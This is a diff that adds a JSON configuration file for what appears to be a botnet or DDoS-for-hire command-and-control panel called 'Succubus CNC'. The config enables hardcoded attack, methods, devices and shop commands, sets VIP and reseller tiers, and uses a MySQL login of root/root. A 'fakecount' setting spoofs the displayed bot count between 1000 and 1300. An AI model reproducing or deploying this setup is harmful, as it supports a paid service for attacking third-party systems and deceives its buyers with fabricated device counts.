@@ -1,0 +1,111 @@
+{
+    "key": "This Key no worky :(",
+    "mysql": {
+        "address": "127.0.0.1:3306",
+        "username": "root",
+        "password": "root",
+        "table": "succubus"
+    },
+    "connection": {
+        "server version": "",
+        "port": 999
+    },
+    "webhook": {
+        "enabled": false,
+        "url": ""
+    },
+    "fakecount": {
+        "enabled": true,
+        "spoof": true,
+        "port": 123,
+        "delay": 10,
+        "chance": 50,
+        "minimum": 1000,
+        "maximum": 1300
+    },
+    "branding": {
+        "title": "F C2-API | [<<$username>>] | Ongoing[<<$allgoing>>/<<$totalusers>>] Online[<<$onlineusers>>/<<$totalusers>>] Expiry[<<$expiry>>] VIP[<<$vip>>] SuperVIP[<<$reseller>>]",
+        "prompt": "<<$username>>@fuck-network:~# ",
+        "assets": {
+            "welcome": "succ",
+            "banner": "succ",
+            "attack": "attack"
+        },
+        "login": {
+            "custom": false,
+            "title": "Welcome to Succubus CNC",
+            "asset": "login",
+            "getuser": "<<include(user)>>",
+            "getpass": "<<include(pass)>>"
+        },
+        "tos": {
+            "enabled": false,
+            "title": "F C2-API TOS",
+            "asset": "tos",
+            "prompt": "F C2-API TOS >",
+            "answer": "setuju"
+        },
+        "otp": {
+            "enabled": false,
+            "title": "[<<$spinner>>] Succcubus Otp [<<$spinner>>]",
+            "asset": "otp",
+            "prompt": "codeplz> "
+        },
+        "errors": {
+            "403": "<theme>403 You Do Not Have Access!</>",
+            "404": "<theme>404 Asset Not Found!</>",
+            "500": "<theme>500 Asset Error!</>"
+        },
+        "hardcoded": {
+            "attack": true,
+            "help": true,
+            "chat": true,
+            "methods": true,
+            "tools": true,
+            "devices": true,
+            "theme": true,
+            "key": true,
+            "shop": true
+        },
+        "captcha": {
+            "enabled": false,
+            "title": "[<<$spinner>>] Succcubus Captcha [<<$spinner>>]",
+            "prompt": "captcha> ",
+            "asset": "captcha"
+        },
+        "misc": {
+            "lock host": false,
+            "lock timezone": true,
+            "chat cooldown": 5,
+            "idle timeout": 260000000,
+            "prompt check": false,
+            "memory assets": false,
+            "spinner": [
+                " ",
+                " ",
+                " ",
+                " "
+            ],
+            "invert gradients": false,
+            "prompt colors": [
+                {
+                    "r": 255,
+                    "g": 255,
+                    "b": 255
+                }
+            ],
+            "gradient": [
+                {
+                    "r": 222,
+                    "g": 3,
+                    "b": 244
+                },
+                {
+                    "r": 0,
+                    "g": 46,
+                    "b": 250
+                }
+            ]
+        }
+    }
+}
